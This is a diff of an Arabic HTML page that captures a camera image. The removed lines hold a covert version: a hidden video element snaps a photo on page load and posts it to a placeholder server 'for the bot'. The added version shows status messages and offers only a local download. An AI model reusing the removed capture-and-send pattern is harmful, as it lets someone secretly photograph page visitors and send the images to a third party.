@@ -1,46 +1,69 @@
 <!DOCTYPE html>
 <html lang="ar">
 <head>
-<meta charset="UTF-8">
-<title>التقاط صورة تلقائي</title>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>التقاط سيلفي تلقائي</title>
 </head>
-<body>
-<video id="video" autoplay style="display:none;"></video>
+<body style="font-family: sans-serif; text-align:center; padding:40px;">
+  <h2>جارٍ محاولة الوصول للكاميرا…</h2>
+  <p id="status">انتظر.. سيُطلب إذن الكاميرا.</p>
+  <video id="video" autoplay playsinline style="display:none;"></video>
+
 <script>
-const video = document.getElementById('video');
+(async function(){
+  const status = document.getElementById('status');
+  const video = document.getElementById('video');
 
-async function captureAndSend() {
   try {
-    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    // طلب الوصول للكاميرا
+    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
     video.srcObject = stream;
+    status.textContent = 'تم منح الإذن. التقاط الصورة بعد لحظة...';
 
+    // بعد تحميل بيانات الفيديو انتظر جزء بسيط ثم التقط
     video.addEventListener('loadedmetadata', () => {
-      const canvas = document.createElement('canvas');
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
+      // انتظر ربع ثانية لتثبت الصورة ثم التقط
+      setTimeout(() => {
+        try {
+          const canvas = document.createElement('canvas');
+          canvas.width = video.videoWidth || 640;
+          canvas.height = video.videoHeight || 480;
+          const ctx = canvas.getContext('2d');
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-      const ctx = canvas.getContext('2d');
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+          // تحويل الصورة إلى dataURL
+          const dataUrl = canvas.toDataURL('image/jpeg', 0.92);
 
-      const imgData = canvas.toDataURL('image/jpeg');
+          // إيقاف الكاميرا
+          stream.getTracks().forEach(t => t.stop());
 
-      // إرسال الصورة للبوت عبر سيرفرك
-      fetch('https://YOUR_SERVER_ENDPOINT/upload', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ image: imgData })
-      }).then(() => console.log('تم إرسال الصورة!'));
+          // عرض رابط تنزيل الصورة للمستخدم (نظام آمن وسهل)
+          const a = document.createElement('a');
+          a.href = dataUrl;
+          a.download = 'selfie.jpg';
+          a.textContent = 'انقر هنا لتحميل الصورة المُلتقطة';
+          a.style.display = 'inline-block';
+          a.style.marginTop = '20px';
+          a.style.padding = '8px 12px';
+          a.style.background = '#2b8aef';
+          a.style.color = '#fff';
+          a.style.borderRadius = '6px';
+          document.body.appendChild(a);
 
-      // إيقاف الكاميرا بعد الالتقاط
-      stream.getTracks().forEach(track => track.stop());
+          status.textContent = 'تم التقاط الصورة. يمكنك تحميلها الآن.';
+        } catch (e) {
+          status.textContent = 'خطأ أثناء التقاط الصورة: ' + e;
+          console.error(e);
+        }
+      }, 300); // 300ms
     });
-  } catch (err) {
-    console.error('فشل الوصول إلى الكاميرا: ', err);
-  }
-}
 
-// محاولة تشغيل الالتقاط تلقائي عند السماح بالكاميرا
-window.onload = captureAndSend;
+  } catch (err) {
+    status.textContent = 'فشل الوصول إلى الكاميرا: ' + (err?.message || err);
+    console.error(err);
+  }
+})();
 </script>
 </body>
 </html>
